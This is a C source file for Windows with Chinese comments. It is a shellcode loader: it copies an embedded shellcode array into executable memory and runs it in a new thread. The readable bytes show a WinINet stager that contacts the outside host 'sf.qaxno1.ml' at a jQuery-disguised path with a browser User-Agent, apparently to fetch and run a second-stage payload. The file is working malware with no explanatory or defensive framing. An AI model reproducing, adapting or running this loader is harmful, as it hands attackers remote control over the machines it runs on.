#include<windows.h>

int main()
{
	int shellcode_size = 0;
	DWORD dwThreadId;
	HANDLE hThread;
	DWORD dw01dRrotect;

	unsigned char buf[] = "\xfc\x48\x83\xe4\xf0\xe8\xc8\x00\x00\x00\x41\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48\x01\xd0\x66\x81\x78\x18\x0b\x02\x75\x72\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b\x12\xe9\x4f\xff\xff\xff\x5d\x6a\x00\x49\xbe\x77\x69\x6e\x69\x6e\x65\x74\x00\x41\x56\x49\x89\xe6\x4c\x89\xf1\x41\xba\x4c\x77\x26\x07\xff\xd5\x48\x31\xc9\x48\x31\xd2\x4d\x31\xc0\x4d\x31\xc9\x41\x50\x41\x50\x41\xba\x3a\x56\x79\xa7\xff\xd5\xe9\x93\x00\x00\x00\x5a\x48\x89\xc1\x41\xb8\xfb\x20\x00\x00\x4d\x31\xc9\x41\x51\x41\x51\x6a\x03\x41\x51\x41\xba\x57\x89\x9f\xc6\xff\xd5\xeb\x79\x5b\x48\x89\xc1\x48\x31\xd2\x49\x89\xd8\x4d\x31\xc9\x52\x68\x00\x32\xc0\x84\x52\x52\x41\xba\xeb\x55\x2e\x3b\xff\xd5\x48\x89\xc6\x48\x83\xc3\x50\x6a\x0a\x5f\x48\x89\xf1\xba\x1f\x00\x00\x00\x6a\x00\x68\x80\x33\x00\x00\x49\x89\xe0\x41\xb9\x04\x00\x00\x00\x41\xba\x75\x46\x9e\x86\xff\xd5\x48\x89\xf1\x48\x89\xda\x49\xc7\xc0\xff\xff\xff\xff\x4d\x31\xc9\x52\x52\x41\xba\x2d\x06\x18\x7b\xff\xd5\x85\xc0\x0f\x85\x9d\x01\x00\x00\x48\xff\xcf\x0f\x84\x8c\x01\x00\x00\xeb\xb3\xe9\xe4\x01\x00\x00\xe8\x82\xff\xff\xff\x2f\x6a\x71\x75\x65\x72\x79\x2f\x31\x2e\x39\x2e\x31\x2f\x6a\x71\x75\x65\x72\x79\x2e\x6d\x69\x6e\x2e\x6a\x73\x00\xfe\xaf\x70\x26\x74\xdf\x1f\x23\x6d\xb8\xa1\xcc\xa9\xb7\xa0\x5b\x3e\x8f\xe5\x91\x08\x9c\x19\x13\x03\x87\x9f\x9a\xda\xd7\x2a\x22\xda\xc3\x2e\x23\x1f\xa8\x9b\x12\x0d\x62\x0c\x51\xbd\xb8\xdb\x70\x74\x57\x2b\x00\x55\x73\x65\x72\x2d\x41\x67\x65\x6e\x74\x3a\x20\x4d\x6f\x7a\x69\x6c\x6c\x61\x2f\x35\x2e\x30\x20\x28\x57\x69\x6e\x64\x6f\x77\x73\x20\x4e\x54\x20\x31\x30\x2e\x30\x3b\x20\x57\x69\x6e\x36\x34\x3b\x20\x78\x36\x34\x29\x20\x41\x70\x70\x6c\x65\x57\x65\x62\x4b\x69\x74\x2f\x35\x33\x37\x2e\x33\x36\x20\x28\x4b\x48\x54\x4d\x4c\x2c\x20\x6c\x69\x6b\x65\x20\x47\x65\x63\x6b\x6f\x29\x20\x43\x68\x72\x6f\x6d\x65\x2f\x39\x30\x2e\x30\x2e\x34\x34\x33\x30\x2e\x32\x31\x32\x20\x53\x61\x66\x61\x72\x69\x2f\x35\x33\x37\x2e\x33\x36\x0d\x0a\x00\xdb\x3a\xaf\x52\x90\x4d\x90\xd1\x18\xad\x2f\x01\x8a\x7c\x4b\x1f\x35\x3f\x3a\x73\x33\x45\x12\xda\x6c\x9e\x27\x66\xf4\x7b\xcc\xf5\x0c\xf3\x59\x22\x05\xf4\x76\xa0\xe7\xf1\x26\x04\x34\x83\x2c\x4c\x13\x02\xeb\xae\x6d\x3a\x9f\x3b\xb2\xd9\x43\x0f\xfb\x9e\xfe\xf8\x49\xe7\x87\x90\xaa\xf9\x6c\x18\x57\x3c\x0e\xb3\x3e\xb7\xec\xc7\x94\xde\x51\x96\x6b\x75\xd0\x38\x4f\xde\x59\x7c\x42\xbe\xd2\x77\x16\xc2\xb3\xd1\xec\xe4\xf4\x1f\x85\x2c\xe4\x79\x1c\x55\x3a\xe4\xc7\x73\xb2\x7f\xe3\x5c\x49\x15\x76\x39\x4f\xb7\xdd\x81\x27\xc9\x00\xbc\xf7\x35\x9e\xbd\x0e\xe4\x09\x72\x4c\xa4\x0a\xcb\xbd\x19\x20\xe6\x8d\xc1\xe1\x79\x60\xf9\x90\xe0\xe1\x92\x50\x8a\x76\x94\xe1\xbb\x18\xd6\xbe\xa6\xaa\xc7\xd5\x33\xd0\xca\x6a\x00\x41\xbe\xf0\xb5\xa2\x56\xff\xd5\x48\x31\xc9\xba\x00\x00\x40\x00\x41\xb8\x00\x10\x00\x00\x41\xb9\x40\x00\x00\x00\x41\xba\x58\xa4\x53\xe5\xff\xd5\x48\x93\x53\x53\x48\x89\xe7\x48\x89\xf1\x48\x89\xda\x41\xb8\x00\x20\x00\x00\x49\x89\xf9\x41\xba\x12\x96\x89\xe2\xff\xd5\x48\x83\xc4\x20\x85\xc0\x74\xb6\x66\x8b\x07\x48\x01\xc3\x85\xc0\x75\xd7\x58\x58\x58\x48\x05\x00\x00\x00\x00\x50\xc3\xe8\x7f\xfd\xff\xff\x73\x66\x2e\x71\x61\x78\x6e\x6f\x31\x2e\x6d\x6c\x00\x00\x00\x00\x00";
	shellcode_size = sizeof(buf);

	LPVOID shellcode = VirtualAlloc(
		NULL,
		shellcode_size,
		MEM_COMMIT,
		PAGE_EXECUTE_READWRITE
	);

	//将shellcode复制到可读可写的内存中
	CopyMemory(shellcode, buf, shellcode_size);

	hThread = CreateThread(
		NULL,	//安全描述符
		NULL,	//栈的大小
		(LPTHREAD_START_ROUTINE)shellcode,//函数
		NULL,	//参数
		NULL,	//线程标志
		&dwThreadId
	);

	WaitForSingleObject(hThread, INFINITE);	//一直等待线程结束
}
